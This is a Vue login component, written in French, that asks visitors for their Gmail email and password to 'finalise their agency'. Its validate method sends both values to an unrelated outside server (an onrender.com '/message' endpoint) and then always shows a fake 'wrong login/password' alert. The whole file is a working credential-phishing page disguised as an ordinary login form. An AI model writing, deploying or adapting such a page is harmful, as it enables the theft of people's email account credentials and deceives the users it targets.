<template>
  <div id="divlogin">
    <h1 style="font-size: 50px;">Login</h1>
    <h2 style="font-size: 40px;">Afin de finaliser votre agence, veuillez indiquer les identifiants/mot de passe de votre compte GMAIL.</h2>
    <div id="loginDiv">
        <div>
            email:
            <input id="login" type="text"/>
        </div>
        <div>
            mot de passe:
            <input id="pwd" type="password"/>
        </div><!-- 
        <div>Pas encore inscrit? cliquez <router-link to="/signup">ici</router-link></div> -->
        <button @click="validate">Valider</button>
    </div>
  </div>
</template>

<script>

export default {
  name: 'LoginView',
  methods: {
    validate(){
        let login = document.getElementById("login").value
        let pwd = document.getElementById("pwd").value
        console.log("login :", login, "pwd :", pwd)
        fetch('https://pokemon-1xp8.onrender.com/message', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: {"login": login, "pwd": pwd}
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log('Réponse serveur:', data)
            alert("Mauvais login/mot de passe")
        })
        .catch(err => console.error(err))
    }
  }
}
</script>

<style>
    #divlogin{
        height: 50vh;
        display: flex;
        flex-direction: column;
        justify-content: space-around;
        align-items: center;
    }

    h1{
        color: red
    }
    
    h2{
        color: red
    }

    #loginDiv{
        height: 50%;
        display: flex;
        flex-direction: column;
        justify-content: space-around;
        align-items: center;    
        color: white;
        width: 30%;
        background-color: lightblue;
        border-radius: 15px;
        border: 1px solid black;
        font-size: 20px;
    }

    #loginDiv button{
        background-color: green;
        color: white;
        border-radius: 5px;
        font-size: 20px;
        cursor: pointer;
    }
</style>
